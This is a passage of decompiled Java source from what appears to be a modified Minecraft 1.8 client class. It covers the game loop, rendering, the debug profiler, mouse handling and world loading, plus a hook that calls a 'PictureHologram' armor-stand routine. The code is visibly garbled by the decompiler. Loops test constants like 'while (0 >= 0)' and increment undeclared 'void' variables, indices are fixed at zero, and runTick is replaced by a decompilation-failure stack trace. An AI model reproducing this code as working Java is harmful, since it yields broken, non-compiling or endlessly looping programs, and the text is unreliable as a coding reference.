            Bootstrap.func_179870_a((String)("#@!@# Game crashed! Crash report saved to: #@!@# " + file2.getAbsolutePath()));
            System.exit((int)-1);
        } else {
            Bootstrap.func_179870_a((String)"#@?@# Game crashed! Crash report could not be saved. #@?@#");
            System.exit((int)-2);
        }
    }

    public boolean isUnicode() {
        return this.mcLanguageManager.isCurrentLocaleUnicode() || this.gameSettings.forceUnicodeFont;
    }

    public void refreshResources() {
        ArrayList arrayList = Lists.newArrayList((Iterable)this.defaultResourcePacks);
        for (ResourcePackRepository.Entry entry : this.mcResourcePackRepository.getRepositoryEntries()) {
            arrayList.add((Object)entry.getResourcePack());
        }
        if (this.mcResourcePackRepository.getResourcePackInstance() != null) {
            arrayList.add((Object)this.mcResourcePackRepository.getResourcePackInstance());
        }
        this.mcResourceManager.reloadResources((List)arrayList);
        this.mcLanguageManager.parseLanguageMetadata((List)arrayList);
        if (this.renderGlobal != null) {
            this.renderGlobal.loadRenderers();
        }
    }

    /*
     * WARNING - void declaration
     */
    private ByteBuffer readImageToBuffer(InputStream inputStream) throws IOException {
        BufferedImage bufferedImage = ImageIO.read((InputStream)inputStream);
        int[] nArray = bufferedImage.getRGB(0, 0, bufferedImage.getWidth(), bufferedImage.getHeight(), null, 0, bufferedImage.getWidth());
        ByteBuffer byteBuffer = ByteBuffer.allocate((int)(4 * nArray.length));
        int[] nArray2 = nArray;
        int n = nArray.length;
        while (0 < n) {
            void var7_7;
            int n2 = nArray2[0];
            byteBuffer.putInt(n2 << 8 | n2 >> 24 & 0xFF);
            ++var7_7;
        }
        byteBuffer.flip();
        return byteBuffer;
    }

    private void updateDisplayMode() throws LWJGLException {
        HashSet hashSet = Sets.newHashSet();
        Collections.addAll((Collection)hashSet, (Object[])Display.getAvailableDisplayModes());
        DisplayMode displayMode = Display.getDesktopDisplayMode();
        if (!hashSet.contains((Object)displayMode) && Util.getOSType() == Util.EnumOS.OSX) {
            block0: for (DisplayMode displayMode2 : macDisplayModes) {
                for (DisplayMode displayMode3 : hashSet) {
                    if (displayMode3.getBitsPerPixel() == 32 && displayMode3.getWidth() == displayMode2.getWidth() && displayMode3.getHeight() == displayMode2.getHeight()) break;
                }
                if (false) continue;
                for (DisplayMode displayMode3 : hashSet) {
                    if (displayMode3.getBitsPerPixel() != 32 || displayMode3.getWidth() != displayMode2.getWidth() / 2 || displayMode3.getHeight() != displayMode2.getHeight() / 2) continue;
                    displayMode = displayMode3;
                    continue block0;
                }
            }
        }
        Display.setDisplayMode((DisplayMode)displayMode);
        this.displayWidth = displayMode.getWidth();
        this.displayHeight = displayMode.getHeight();
    }

    private void func_180510_a(TextureManager textureManager) {
        ScaledResolution scaledResolution = new ScaledResolution(this, this.displayWidth, this.displayHeight);
        int n = scaledResolution.getScaleFactor();
        Framebuffer framebuffer = new Framebuffer(ScaledResolution.getScaledWidth() * n, ScaledResolution.getScaledHeight() * n, true);
        framebuffer.bindFramebuffer(false);
        GlStateManager.matrixMode((int)5889);
        GlStateManager.ortho((double)0.0, (double)ScaledResolution.getScaledWidth(), (double)ScaledResolution.getScaledHeight(), (double)0.0, (double)1000.0, (double)3000.0);
        GlStateManager.matrixMode((int)5888);
        GlStateManager.translate((float)0.0f, (float)0.0f, (float)-2000.0f);
        InputStream inputStream = null;
        inputStream = this.mcDefaultResourcePack.getInputStream(locationMojangPng);
        this.mojangLogo = textureManager.getDynamicTextureLocation("logo", new DynamicTexture(ImageIO.read((InputStream)inputStream)));
        textureManager.bindTexture(this.mojangLogo);
        IOUtils.closeQuietly((InputStream)inputStream);
        Tessellator tessellator = Tessellator.getInstance();
        WorldRenderer worldRenderer = tessellator.getWorldRenderer();
        worldRenderer.startDrawingQuads();
        worldRenderer.func_178991_c(0xFFFFFF);
        worldRenderer.addVertexWithUV(0.0, (double)this.displayHeight, 0.0, 0.0, 0.0);
        worldRenderer.addVertexWithUV((double)this.displayWidth, (double)this.displayHeight, 0.0, 0.0, 0.0);
        worldRenderer.addVertexWithUV((double)this.displayWidth, 0.0, 0.0, 0.0, 0.0);
        worldRenderer.addVertexWithUV(0.0, 0.0, 0.0, 0.0, 0.0);
        tessellator.draw();
        GlStateManager.color((float)1.0f, (float)1.0f, (float)1.0f, (float)1.0f);
        worldRenderer.func_178991_c(0xFFFFFF);
        this.scaledTessellator((ScaledResolution.getScaledWidth() - 256) / 2, (ScaledResolution.getScaledHeight() - 256) / 2, 0, 0, 256, 256);
        framebuffer.unbindFramebuffer();
        framebuffer.framebufferRender(ScaledResolution.getScaledWidth() * n, ScaledResolution.getScaledHeight() * n);
        GlStateManager.alphaFunc((int)516, (float)0.1f);
        this.func_175601_h();
    }

    public void scaledTessellator(int n, int n2, int n3, int n4, int n5, int n6) {
        float f = 0.00390625f;
        float f2 = 0.00390625f;
        WorldRenderer worldRenderer = Tessellator.getInstance().getWorldRenderer();
        worldRenderer.startDrawingQuads();
        worldRenderer.addVertexWithUV((double)(n + 0), (double)(n2 + n6), 0.0, (double)((float)(n3 + 0) * f), (double)((float)(n4 + n6) * f2));
        worldRenderer.addVertexWithUV((double)(n + n5), (double)(n2 + n6), 0.0, (double)((float)(n3 + n5) * f), (double)((float)(n4 + n6) * f2));
        worldRenderer.addVertexWithUV((double)(n + n5), (double)(n2 + 0), 0.0, (double)((float)(n3 + n5) * f), (double)((float)(n4 + 0) * f2));
        worldRenderer.addVertexWithUV((double)(n + 0), (double)(n2 + 0), 0.0, (double)((float)(n3 + 0) * f), (double)((float)(n4 + 0) * f2));
        Tessellator.getInstance().draw();
    }

    public ISaveFormat getSaveLoader() {
        return this.saveLoader;
    }

    public void displayGuiScreen(GuiScreen guiScreen) {
        if (this.currentScreen != null) {
            this.currentScreen.onGuiClosed();
        }
        if (guiScreen == null && theWorld == null) {
            guiScreen = new GuiMainMenu();
        } else if (guiScreen == null && thePlayer.getHealth() <= 0.0f) {
            guiScreen = new GuiGameOver();
        }
        if (guiScreen instanceof GuiMainMenu) {
            this.gameSettings.showDebugInfo = false;
            ingameGUI.getChatGUI().clearChatMessages();
        }
        this.currentScreen = guiScreen;
        if (guiScreen != null) {
            this.setIngameNotInFocus();
            ScaledResolution scaledResolution = new ScaledResolution(this, this.displayWidth, this.displayHeight);
            int n = ScaledResolution.getScaledWidth();
            int n2 = ScaledResolution.getScaledHeight();
            guiScreen.setWorldAndResolution(this, n, n2);
            this.skipRenderWorld = false;
        } else {
            mcSoundHandler.resumeSounds();
            this.setIngameFocus();
        }
    }

    private void checkGLError(String string) {
        int n;
        if (this.field_175619_R && (n = GL11.glGetError()) != 0) {
            String string2 = GLU.gluErrorString((int)n);
            logger.error("########## GL ERROR ##########");
            logger.error("@ " + string);
            logger.error(String.valueOf((int)n) + ": " + string2);
        }
    }

    public void shutdownMinecraftApplet() {
        this.stream.shutdownStream();
        logger.info("Stopping!");
        this.loadWorld(null);
        mcSoundHandler.unloadSounds();
        if (!this.hasCrashed) {
            System.exit((int)0);
        }
        System.gc();
    }

    /*
     * WARNING - void declaration
     */
    private void runGameLoop() throws IOException {
        this.mcProfiler.startSection("root");
        if (Display.isCreated() && Display.isCloseRequested()) {
            this.shutdown();
        }
        if (this.isGamePaused && theWorld != null) {
            float f = this.timer.renderPartialTicks;
            this.timer.updateTimer();
            this.timer.renderPartialTicks = f;
        } else {
            this.timer.updateTimer();
        }
        this.mcProfiler.startSection("scheduledExecutables");
        Queue queue = this.scheduledTasks;
        Queue queue2 = this.scheduledTasks;
        synchronized (queue2) {
            while (!this.scheduledTasks.isEmpty()) {
                ((FutureTask)this.scheduledTasks.poll()).run();
            }
        }
        this.mcProfiler.endSection();
        long l = System.nanoTime();
        this.mcProfiler.startSection("tick");
        while (0 < this.timer.elapsedTicks) {
            void var4_5;
            this.runTick();
            ++var4_5;
        }
        this.mcProfiler.endStartSection("preRenderErrors");
        long l2 = System.nanoTime() - l;
        this.checkGLError("Pre render");
        this.mcProfiler.endStartSection("sound");
        mcSoundHandler.setListener((EntityPlayer)thePlayer, this.timer.renderPartialTicks);
        this.mcProfiler.endSection();
        this.mcProfiler.startSection("render");
        GlStateManager.clear((int)16640);
        this.framebufferMc.bindFramebuffer(true);
        this.mcProfiler.startSection("display");
        if (thePlayer != null && thePlayer.isEntityInsideOpaqueBlock()) {
            this.gameSettings.thirdPersonView = 0;
        }
        this.mcProfiler.endSection();
        if (!this.skipRenderWorld) {
            this.mcProfiler.endStartSection("gameRenderer");
            this.entityRenderer.updateCameraAndRender(this.timer.renderPartialTicks);
            this.mcProfiler.endSection();
        }
        this.mcProfiler.endSection();
        if (this.gameSettings.showDebugInfo && this.gameSettings.showDebugProfilerChart && !this.gameSettings.hideGUI) {
            if (!this.mcProfiler.profilingEnabled) {
                this.mcProfiler.clearProfiling();
            }
            this.mcProfiler.profilingEnabled = true;
            this.displayDebugInfo(l2);
        } else {
            this.mcProfiler.profilingEnabled = false;
            this.prevFrameTime = System.nanoTime();
        }
        this.guiAchievement.updateAchievementWindow();
        this.framebufferMc.unbindFramebuffer();
        this.framebufferMc.framebufferRender(this.displayWidth, this.displayHeight);
        this.entityRenderer.func_152430_c(this.timer.renderPartialTicks);
        this.mcProfiler.startSection("root");
        this.func_175601_h();
        Thread.yield();
        this.mcProfiler.startSection("stream");
        this.mcProfiler.startSection("update");
        this.stream.func_152935_j();
        this.mcProfiler.endStartSection("submit");
        this.stream.func_152922_k();
        this.mcProfiler.endSection();
        this.mcProfiler.endSection();
        this.checkGLError("Post render");
        ++this.fpsCounter;
        this.isGamePaused = this.isSingleplayer() && this.currentScreen != null && this.currentScreen.doesGuiPauseGame() && !this.theIntegratedServer.getPublic();
        while (Minecraft.getSystemTime() >= this.debugUpdateTime + 1000L) {
            debugFPS = this.fpsCounter;
            this.debug = String.format((String)"%d fps (%d chunk update%s) T: %s%s%s%s%s", (Object[])new Object[]{debugFPS, RenderChunk.field_178592_a, RenderChunk.field_178592_a != 1 ? "s" : "", (float)this.gameSettings.limitFramerate == GameSettings.Options.FRAMERATE_LIMIT.getValueMax() ? "inf" : Integer.valueOf((int)this.gameSettings.limitFramerate), this.gameSettings.enableVsync ? " vsync" : "", this.gameSettings.fancyGraphics ? "" : " fast", this.gameSettings.clouds ? " clouds" : "", OpenGlHelper.func_176075_f() ? " vbo" : ""});
            RenderChunk.field_178592_a = 0;
            this.debugUpdateTime += 1000L;
            this.fpsCounter = 0;
            this.usageSnooper.addMemoryStatsToSnooper();
            if (this.usageSnooper.isSnooperRunning()) continue;
            this.usageSnooper.startSnooper();
        }
        if (this.isFramerateLimitBelowMax()) {
            this.mcProfiler.startSection("fpslimit_wait");
            Display.sync((int)this.getLimitFramerate());
            this.mcProfiler.endSection();
        }
        this.mcProfiler.endSection();
    }

    public void func_175601_h() {
        this.mcProfiler.startSection("display_update");
        this.mcProfiler.endSection();
        this.func_175604_i();
    }

    protected void func_175604_i() {
        if (!this.fullscreen && Display.wasResized()) {
            int n = this.displayWidth;
            int n2 = this.displayHeight;
            this.displayWidth = Display.getWidth();
            this.displayHeight = Display.getHeight();
            if (this.displayWidth != n || this.displayHeight != n2) {
                if (this.displayWidth <= 0) {
                    this.displayWidth = 1;
                }
                if (this.displayHeight <= 0) {
                    this.displayHeight = 1;
                }
                this.resize(this.displayWidth, this.displayHeight);
            }
        }
    }

    public int getLimitFramerate() {
        return theWorld == null && this.currentScreen != null ? 30 : this.gameSettings.limitFramerate;
    }

    public boolean isFramerateLimitBelowMax() {
        return (float)this.getLimitFramerate() < GameSettings.Options.FRAMERATE_LIMIT.getValueMax();
    }

    public void freeMemory() {
        memoryReserve = new byte[0];
        this.renderGlobal.deleteAllDisplayLists();
        System.gc();
        this.loadWorld(null);
        System.gc();
    }

    private void updateDebugProfilerName(int n) {
        List list = this.mcProfiler.getProfilingData(this.debugProfilerName);
        if (list != null && !list.isEmpty()) {
            Profiler.Result result = (Profiler.Result)list.remove(0);
            if (n == 0) {
                int n2;
                if (result.field_76331_c.length() > 0 && (n2 = this.debugProfilerName.lastIndexOf(".")) >= 0) {
                    this.debugProfilerName = this.debugProfilerName.substring(0, n2);
                }
            } else if (--n < list.size() && !((Profiler.Result)list.get((int)n)).field_76331_c.equals((Object)"unspecified")) {
                if (this.debugProfilerName.length() > 0) {
                    this.debugProfilerName = String.valueOf((Object)this.debugProfilerName) + ".";
                }
                this.debugProfilerName = String.valueOf((Object)this.debugProfilerName) + ((Profiler.Result)list.get((int)n)).field_76331_c;
            }
        }
    }

    /*
     * WARNING - void declaration
     */
    private void displayDebugInfo(long l) {
        if (this.mcProfiler.profilingEnabled) {
            void var15_13;
            Object object;
            List list = this.mcProfiler.getProfilingData(this.debugProfilerName);
            Profiler.Result result = (Profiler.Result)list.remove(0);
            GlStateManager.clear((int)256);
            GlStateManager.matrixMode((int)5889);
            GlStateManager.ortho((double)0.0, (double)this.displayWidth, (double)this.displayHeight, (double)0.0, (double)1000.0, (double)3000.0);
            GlStateManager.matrixMode((int)5888);
            GlStateManager.translate((float)0.0f, (float)0.0f, (float)-2000.0f);
            GL11.glLineWidth((float)1.0f);
            Tessellator tessellator = Tessellator.getInstance();
            WorldRenderer worldRenderer = tessellator.getWorldRenderer();
            int n = this.displayWidth - 160 - 10;
            int n2 = this.displayHeight - 320;
            worldRenderer.startDrawingQuads();
            worldRenderer.func_178974_a(0, 200);
            worldRenderer.addVertex((double)((float)n - (float)160 * 1.1f), (double)((float)n2 - (float)160 * 0.6f - 16.0f), 0.0);
            worldRenderer.addVertex((double)((float)n - (float)160 * 1.1f), (double)(n2 + 320), 0.0);
            worldRenderer.addVertex((double)((float)n + (float)160 * 1.1f), (double)(n2 + 320), 0.0);
            worldRenderer.addVertex((double)((float)n + (float)160 * 1.1f), (double)((float)n2 - (float)160 * 0.6f - 16.0f), 0.0);
            tessellator.draw();
            double d = 0.0;
            while (0 < list.size()) {
                void var13_10;
                float f;
                float f2;
                float f3;
                object = (Profiler.Result)list.get(0);
                int n3 = MathHelper.floor_double((double)(object.field_76332_a / 4.0)) + 1;
                worldRenderer.startDrawing(6);
                worldRenderer.func_178991_c(object.func_76329_a());
                worldRenderer.addVertex((double)n, (double)n2, 0.0);
                while (0 >= 0) {
                    f3 = (float)((d + object.field_76332_a * 0.0 / (double)0xFFFFFF) * Math.PI * 2.0 / 100.0);
                    f2 = MathHelper.sin((float)f3) * (float)160;
                    f = MathHelper.cos((float)f3) * (float)160 * 0.5f;
                    worldRenderer.addVertex((double)((float)n + f2), (double)((float)n2 - f), 0.0);
                    --var15_13;
                }
                tessellator.draw();
                worldRenderer.startDrawing(5);
                worldRenderer.func_178991_c((object.func_76329_a() & 0xFEFEFE) >> 1);
                while (0 >= 0) {
                    f3 = (float)((d + object.field_76332_a * 0.0 / (double)0xFFFFFF) * Math.PI * 2.0 / 100.0);
                    f2 = MathHelper.sin((float)f3) * (float)160;
                    f = MathHelper.cos((float)f3) * (float)160 * 0.5f;
                    worldRenderer.addVertex((double)((float)n + f2), (double)((float)n2 - f), 0.0);
                    worldRenderer.addVertex((double)((float)n + f2), (double)((float)n2 - f + 10.0f), 0.0);
                    --var15_13;
                }
                tessellator.draw();
                d += object.field_76332_a;
                ++var13_10;
            }
            DecimalFormat decimalFormat = new DecimalFormat("##0.00");
            object = "";
            if (!result.field_76331_c.equals((Object)"unspecified")) {
                object = String.valueOf((Object)object) + "[0] ";
            }
            object = result.field_76331_c.length() == 0 ? String.valueOf((Object)object) + "ROOT " : String.valueOf((Object)object) + result.field_76331_c + " ";
            fontRendererObj.func_175063_a((String)object, (float)(n - 160), (float)(n2 - 1 - 16), 0xFFFFFF);
            object = String.valueOf((Object)decimalFormat.format(result.field_76330_b)) + "%";
            fontRendererObj.func_175063_a((String)object, (float)(n + 160 - fontRendererObj.getStringWidth((String)object)), (float)(n2 - 1 - 16), 0xFFFFFF);
            while (0 < list.size()) {
                Profiler.Result result2 = (Profiler.Result)list.get(0);
                String string = "";
                string = result2.field_76331_c.equals((Object)"unspecified") ? String.valueOf((Object)string) + "[?] " : String.valueOf((Object)string) + "[" + 1 + "] ";
                string = String.valueOf((Object)string) + result2.field_76331_c;
                fontRendererObj.func_175063_a(string, (float)(n - 160), (float)(n2 + 1 + 0 + 20), result2.func_76329_a());
                string = String.valueOf((Object)decimalFormat.format(result2.field_76332_a)) + "%";
                fontRendererObj.func_175063_a(string, (float)(n + 160 - 50 - fontRendererObj.getStringWidth(string)), (float)(n2 + 1 + 0 + 20), result2.func_76329_a());
                string = String.valueOf((Object)decimalFormat.format(result2.field_76330_b)) + "%";
                fontRendererObj.func_175063_a(string, (float)(n + 160 - fontRendererObj.getStringWidth(string)), (float)(n2 + 1 + 0 + 20), result2.func_76329_a());
                ++var15_13;
            }
        }
    }

    public void shutdown() {
        this.running = false;
    }

    public void setIngameFocus() {
        if (Display.isActive() && !this.inGameHasFocus) {
            this.inGameHasFocus = true;
            this.mouseHelper.grabMouseCursor();
            this.displayGuiScreen(null);
            this.leftClickCounter = 10000;
        }
    }

    public void setIngameNotInFocus() {
        if (this.inGameHasFocus) {
            this.inGameHasFocus = false;
            this.mouseHelper.ungrabMouseCursor();
        }
    }

    public void displayInGameMenu() {
        if (this.currentScreen == null) {
            this.displayGuiScreen((GuiScreen)new GuiIngameMenu());
            if (this.isSingleplayer() && !this.theIntegratedServer.getPublic()) {
                mcSoundHandler.pauseSounds();
            }
        }
    }

    private void sendClickBlockToController(boolean bl) {
        if (!bl) {
            this.leftClickCounter = 0;
        }
        if (this.leftClickCounter <= 0 && !thePlayer.isUsingItem()) {
            if (bl && this.objectMouseOver != null && this.objectMouseOver.typeOfHit == MovingObjectPosition.MovingObjectType.BLOCK) {
                BlockPos blockPos = this.objectMouseOver.func_178782_a();
                if (theWorld.getBlockState(blockPos).getBlock().getMaterial() != Material.air && playerController.func_180512_c(blockPos, this.objectMouseOver.field_178784_b)) {
                    this.effectRenderer.func_180532_a(blockPos, this.objectMouseOver.field_178784_b);
                    thePlayer.swingItem();
                }
            } else {
                playerController.resetBlockRemoving();
            }
        }
    }

    public void clickMouse() {
        if (this.leftClickCounter <= 0) {
            thePlayer.swingItem();
            if (this.objectMouseOver == null) {
                logger.error("Null returned as 'hitResult', this shouldn't happen!");
                if (playerController.isNotCreative()) {
                    this.leftClickCounter = 10;
                }
            } else {
                switch (SwitchEnumMinecartType.field_152390_a[this.objectMouseOver.typeOfHit.ordinal()]) {
                    case 1: {
                        playerController.attackEntity((EntityPlayer)thePlayer, this.objectMouseOver.entityHit);
                        break;
                    }
                    case 2: {
                        BlockPos blockPos = this.objectMouseOver.func_178782_a();
                        if (theWorld.getBlockState(blockPos).getBlock().getMaterial() != Material.air) {
                            playerController.func_180511_b(blockPos, this.objectMouseOver.field_178784_b);
                            break;
                        }
                    }
                    default: {
                        if (!playerController.isNotCreative()) break;
                        this.leftClickCounter = 10;
                    }
                }
            }
        }
    }

    public void rightClickMouse() {
        ItemStack itemStack;
        rightClickDelayTimer = 4;
        ItemStack itemStack2 = Minecraft.thePlayer.inventory.getCurrentItem();
        if (itemStack2 != null && itemStack2.getDisplayName().contains((CharSequence)"#")) {
            PictureHologram.client.giveNextArmorstand();
        }
        if (this.objectMouseOver == null) {
            logger.warn("Null returned as 'hitResult', this shouldn't happen!");
        } else {
            switch (SwitchEnumMinecartType.field_152390_a[this.objectMouseOver.typeOfHit.ordinal()]) {
                case 1: {
                    if (playerController.func_178894_a((EntityPlayer)thePlayer, this.objectMouseOver.entityHit, this.objectMouseOver) || !playerController.interactWithEntitySendPacket((EntityPlayer)thePlayer, this.objectMouseOver.entityHit)) break;
                    break;
                }
                case 2: {
                    int n;
                    itemStack = this.objectMouseOver.func_178782_a();
                    if (theWorld.getBlockState((BlockPos)itemStack).getBlock().getMaterial() == Material.air) break;
                    int n2 = n = itemStack2 != null ? itemStack2.stackSize : 0;
                    if (playerController.func_178890_a(thePlayer, theWorld, itemStack2, (BlockPos)itemStack, this.objectMouseOver.field_178784_b, this.objectMouseOver.hitVec)) {
                        thePlayer.swingItem();
                    }
                    if (itemStack2 == null) {
                        return;
                    }
                    if (itemStack2.stackSize == 0) {
                        Minecraft.thePlayer.inventory.mainInventory[Minecraft.thePlayer.inventory.currentItem] = null;
                        break;
                    }
                    if (itemStack2.stackSize == n && !playerController.isInCreativeMode()) break;
                    this.entityRenderer.itemRenderer.resetEquippedProgress();
                }
            }
        }
        if (false && (itemStack = Minecraft.thePlayer.inventory.getCurrentItem()) != null && playerController.sendUseItem((EntityPlayer)thePlayer, (World)theWorld, itemStack)) {
            this.entityRenderer.itemRenderer.resetEquippedProgress2();
        }
    }

    public void toggleFullscreen() {
        this.gameSettings.fullScreen = this.fullscreen = !this.fullscreen;
        if (this.fullscreen) {
            this.updateDisplayMode();
            this.displayWidth = Display.getDisplayMode().getWidth();
            this.displayHeight = Display.getDisplayMode().getHeight();
            if (this.displayWidth <= 0) {
                this.displayWidth = 1;
            }
            if (this.displayHeight <= 0) {
                this.displayHeight = 1;
            }
        } else {
            Display.setDisplayMode((DisplayMode)new DisplayMode(this.tempDisplayWidth, this.tempDisplayHeight));
            this.displayWidth = this.tempDisplayWidth;
            this.displayHeight = this.tempDisplayHeight;
            if (this.displayWidth <= 0) {
                this.displayWidth = 1;
            }
            if (this.displayHeight <= 0) {
                this.displayHeight = 1;
            }
        }
        if (this.currentScreen != null) {
            this.resize(this.displayWidth, this.displayHeight);
        } else {
            this.updateFramebufferSize();
        }
        Display.setFullscreen((boolean)this.fullscreen);
        Display.setVSyncEnabled((boolean)this.gameSettings.enableVsync);
        this.func_175601_h();
    }

    private void resize(int n, int n2) {
        this.displayWidth = Math.max((int)1, (int)n);
        this.displayHeight = Math.max((int)1, (int)n2);
        if (this.currentScreen != null) {
            ScaledResolution scaledResolution = new ScaledResolution(this, n, n2);
            this.currentScreen.func_175273_b(this, ScaledResolution.getScaledWidth(), ScaledResolution.getScaledHeight());
        }
        this.loadingScreen = new LoadingScreenRenderer(this);
        this.updateFramebufferSize();
    }

    private void updateFramebufferSize() {
        this.framebufferMc.createBindFramebuffer(this.displayWidth, this.displayHeight);
        if (this.entityRenderer != null) {
            this.entityRenderer.updateShaderGroupSize(this.displayWidth, this.displayHeight);
        }
    }

    /*
     * Exception decompiling
     */
    public void runTick() throws IOException {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Invalid stack depths @ lbl582 : ALOAD_0 - null : trying to set 5 previously set to 0
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs.populateStackInfo(Op02WithProcessedDataAndRefs.java:207)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs.populateStackInfo(Op02WithProcessedDataAndRefs.java:1565)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:433)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1042)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:929)
         *     at org.benf.cfr.reader.Driver.doClass(Driver.java:84)
         *     at org.benf.cfr.reader.Main.doClass(Main.java:18)
         *     at org.benf.cfr.reader.PluginRunner.getDecompilationFor(PluginRunner.java:115)
         *     at me.grax.jbytemod.decompiler.CFRDecompiler.decompile(CFRDecompiler.java:160)
         *     at me.grax.jbytemod.decompiler.Decompiler.decompile(Decompiler.java:59)
         *     at me.grax.jbytemod.decompiler.Decompiler.run(Decompiler.java:44)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    public void launchIntegratedServer(String string, String string2, WorldSettings worldSettings) {
        String string3;
        this.loadWorld(null);
        System.gc();
        ISaveHandler iSaveHandler = this.saveLoader.getSaveLoader(string, false);
        WorldInfo worldInfo = iSaveHandler.loadWorldInfo();
        if (worldInfo == null && worldSettings != null) {
            worldInfo = new WorldInfo(worldSettings, string);
            iSaveHandler.saveWorldInfo(worldInfo);
        }
        if (worldSettings == null) {
            worldSettings = new WorldSettings(worldInfo);
        }
        this.theIntegratedServer = new IntegratedServer(this, string, string2, worldSettings);
        this.theIntegratedServer.startServerThread();
        this.integratedServerIsRunning = true;
        this.loadingScreen.displaySavingString(I18n.format((String)"menu.loadingLevel", (Object[])new Object[0]));
        while (!this.theIntegratedServer.serverIsInRunLoop()) {
            string3 = this.theIntegratedServer.getUserMessage();
            if (string3 != null) {
                this.loadingScreen.displayLoadingString(I18n.format((String)string3, (Object[])new Object[0]));
            } else {
                this.loadingScreen.displayLoadingString("");
            }
            Thread.sleep((long)200L);
        }
        this.displayGuiScreen(null);
        string3 = this.theIntegratedServer.getNetworkSystem().addLocalEndpoint();
        NetworkManager networkManager = NetworkManager.provideLocalClient((SocketAddress)string3);
        networkManager.setNetHandler((INetHandler)new NetHandlerLoginClient(networkManager, this, null));
        networkManager.sendPacket((Packet)new C00Handshake(47, string3.toString(), 0, EnumConnectionState.LOGIN));
        networkManager.sendPacket((Packet)new C00PacketLoginStart(Minecraft.getSession().getProfile()));
        this.myNetworkManager = networkManager;
    }

    public void loadWorld(WorldClient worldClient) {
        this.loadWorld(worldClient, "");
    }

    public void loadWorld(WorldClient worldClient, String string) {
        if (worldClient == null) {
            NetHandlerPlayClient netHandlerPlayClient = this.getNetHandler();
            if (netHandlerPlayClient != null) {
                netHandlerPlayClient.cleanup();
            }
            if (this.theIntegratedServer != null && this.theIntegratedServer.func_175578_N()) {
                this.theIntegratedServer.initiateShutdown();
                this.theIntegratedServer.func_175592_a();
            }
            this.theIntegratedServer = null;
            this.guiAchievement.clearAchievements();
            this.entityRenderer.getMapItemRenderer().func_148249_a();
        }
        this.field_175622_Z = null;
        this.myNetworkManager = null;
        if (this.loadingScreen != null) {
            this.loadingScreen.resetProgressAndMessage(string);
            this.loadingScreen.displayLoadingString("");
        }
        if (worldClient == null && theWorld != null) {
            if (this.mcResourcePackRepository.getResourcePackInstance() != null) {
                this.mcResourcePackRepository.func_148529_f();
                this.func_175603_A();
            }
            this.setServerData(null);
            this.integratedServerIsRunning = false;
        }
        mcSoundHandler.stopSounds();
        theWorld = worldClient;
        if (worldClient != null) {
            if (this.renderGlobal != null) {
                this.renderGlobal.setWorldAndLoadRenderers(worldClient);
            }
            if (this.effectRenderer != null) {
                this.effectRenderer.clearEffects((World)worldClient);
            }
            if (thePlayer == null) {
                thePlayer = playerController.func_178892_a((World)worldClient, new StatFileWriter());
                playerController.flipPlayer((EntityPlayer)thePlayer);
            }
            thePlayer.preparePlayerToSpawn();
            worldClient.spawnEntityInWorld((Entity)thePlayer);
            Minecraft.thePlayer.movementInput = new MovementInputFromOptions(this.gameSettings);
            playerController.setPlayerCapabilities((EntityPlayer)thePlayer);
            this.field_175622_Z = thePlayer;
        } else {
            this.saveLoader.flushCache();
            thePlayer = null;
        }
        System.gc();
        this.systemTime = 0L;
    }

    public void setDimensionAndSpawnPlayer(int n) {
        theWorld.setInitialSpawnLocation();
        theWorld.removeAllEntities();
        String string = null;
        if (thePlayer != null) {
            int n2 = thePlayer.getEntityId();
            theWorld.removeEntity((Entity)thePlayer);
            string = thePlayer.getClientBrand();
        }
        this.field_175622_Z = null;
        EntityPlayerSP entityPlayerSP = thePlayer;
        thePlayer = playerController.func_178892_a((World)theWorld, thePlayer == null ? new StatFileWriter() : thePlayer.getStatFileWriter());
        thePlayer.getDataWatcher().updateWatchedObjectsFromList(entityPlayerSP.getDataWatcher().getAllWatched());
        Minecraft.thePlayer.dimension = n;
        this.field_175622_Z = thePlayer;
        thePlayer.preparePlayerToSpawn();
        thePlayer.func_175158_f(string);
        theWorld.spawnEntityInWorld((Entity)thePlayer);
        playerController.flipPlayer((EntityPlayer)thePlayer);
        Minecraft.thePlayer.movementInput = new MovementInputFromOptions(this.gameSettings);
        thePlayer.setEntityId(0);
        playerController.setPlayerCapabilities((EntityPlayer)thePlayer);
        thePlayer.func_175150_k(entityPlayerSP.func_175140_cp());
        if (this.currentScreen instanceof GuiGameOver) {
            this.displayGuiScreen(null);
        }
    }

    public final boolean isDemo() {
        return this.isDemo;
    }

    public NetHandlerPlayClient getNetHandler() {
        return thePlayer != null ? Minecraft.thePlayer.sendQueue : null;
    }

    public static boolean isGuiEnabled() {
        return theMinecraft == null || !Minecraft.theMinecraft.gameSettings.hideGUI;
    }

    public static boolean isFancyGraphicsEnabled() {
        return theMinecraft != null && Minecraft.theMinecraft.gameSettings.fancyGraphics;
    }

    public static boolean isAmbientOcclusionEnabled() {
        return theMinecraft != null && Minecraft.theMinecraft.gameSettings.ambientOcclusion != 0;
    }

    private void middleClickMouse() {
        if (this.objectMouseOver != null) {
            Block block;
            Item item;
            Block block2;
            BlockPos blockPos;
            boolean bl = Minecraft.thePlayer.capabilities.isCreativeMode;
            TileEntity tileEntity = null;
            if (this.objectMouseOver.typeOfHit == MovingObjectPosition.MovingObjectType.BLOCK) {
                blockPos = this.objectMouseOver.func_178782_a();
                block2 = theWorld.getBlockState(blockPos).getBlock();
                if (block2.getMaterial() == Material.air) {
                    return;
                }
                item = block2.getItem((World)theWorld, blockPos);
                if (item == null) {
                    return;
                }
                if (bl && GuiScreen.isCtrlKeyDown()) {
                    tileEntity = theWorld.getTileEntity(blockPos);
                }
                block = item instanceof ItemBlock && !block2.isFlowerPot() ? Block.getBlockFromItem((Item)item) : block2;
